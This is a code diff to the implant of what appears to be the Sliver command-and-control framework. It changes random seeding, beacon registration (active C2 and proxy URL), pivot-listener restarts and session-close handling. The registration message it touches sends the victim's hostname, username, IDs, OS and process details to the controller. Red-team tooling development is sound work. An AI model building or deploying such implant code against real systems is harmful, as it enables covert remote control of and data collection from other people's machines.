@@ -81,11 +81,10 @@ var (
 func init() {
 	buf := make([]byte, 8)
 	n, err := rand.Read(buf)
-	seed := uint64(time.Now().Unix())
-	if err == nil && n == len(buf) {
-		binary.LittleEndian.PutUint64(buf, uint64(seed))
+	if err != nil || n != len(buf) {
+		binary.LittleEndian.PutUint64(buf, uint64(time.Now().Unix()))
 	}
-	insecureRand.Seed(int64(seed))
+	insecureRand.Seed(int64(binary.LittleEndian.Uint64(buf)))
 
 	id, err := uuid.NewV4()
 	if err != nil {
@@ -296,8 +295,8 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	// {{end}}
 	nextCheckin := time.Now().Add(beacon.Duration())
 	register := registerSliver()
-	register.ActiveC2 = beacon.URL()
-	register.ProxyURL = beacon.ProxyURL()
+	register.ActiveC2 = beacon.ActiveC2
+	register.ProxyURL = beacon.ProxyURL
 	beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
 		ID:          InstanceID,
 		Interval:    beacon.Interval(),
@@ -528,7 +527,10 @@ func sessionMainLoop(connection *transports.Connection) error {
 		// {{end}}
 		return nil
 	}
+	pivots.RestartAllListeners(connection.Send)
+	defer pivots.StopAllListeners()
 	defer connection.Stop()
+
 	connectionErrors = 0
 	// Reconnect active pivots
 	// pivots.ReconnectActivePivots(connection)
@@ -590,6 +592,8 @@ func sessionMainLoop(connection *transports.Connection) error {
 			log.Printf("[recv] tunHandler %d", envelope.Type)
 			// {{end}}
 			go handler(envelope, connection)
+		} else if envelope.Type == sliverpb.MsgCloseSession {
+			return nil
 		} else {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] unknown envelope type %d", envelope.Type)
@@ -619,7 +623,7 @@ func wrapEnvelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.E
 	}
 }
 
-// registerSliver - Creates a registartion protobuf message
+// registerSliver - Creates a registration protobuf message
 func registerSliver() *sliverpb.Register {
 	hostname, err := os.Hostname()
 	if err != nil {
@@ -661,21 +665,19 @@ func registerSliver() *sliverpb.Register {
 	// {{end}}
 
 	return &sliverpb.Register{
-		Name:     consts.SliverName,
-		Hostname: hostname,
-		Uuid:     uuid,
-		Username: currentUser.Username,
-		Uid:      currentUser.Uid,
-		Gid:      currentUser.Gid,
-		Os:       runtime.GOOS,
-		Version:  version.GetVersion(),
-		Arch:     runtime.GOARCH,
-		Pid:      int32(os.Getpid()),
-		Filename: filename,
-		// ActiveC2:          transports.GetActiveC2(),
+		Name:              consts.SliverName,
+		Hostname:          hostname,
+		Uuid:              uuid,
+		Username:          currentUser.Username,
+		Uid:               currentUser.Uid,
+		Gid:               currentUser.Gid,
+		Os:                runtime.GOOS,
+		Version:           version.GetVersion(),
+		Arch:              runtime.GOARCH,
+		Pid:               int32(os.Getpid()),
+		Filename:          filename,
 		ReconnectInterval: int64(transports.GetReconnectInterval()),
-		// ProxyURL:          transports.GetProxyURL(),
-		ConfigID: "{{ .Config.ID }}",
-		PeerID:   pivots.MyPeerID,
+		ConfigID:          "{{ .Config.ID }}",
+		PeerID:            pivots.MyPeerID,
 	}
 }
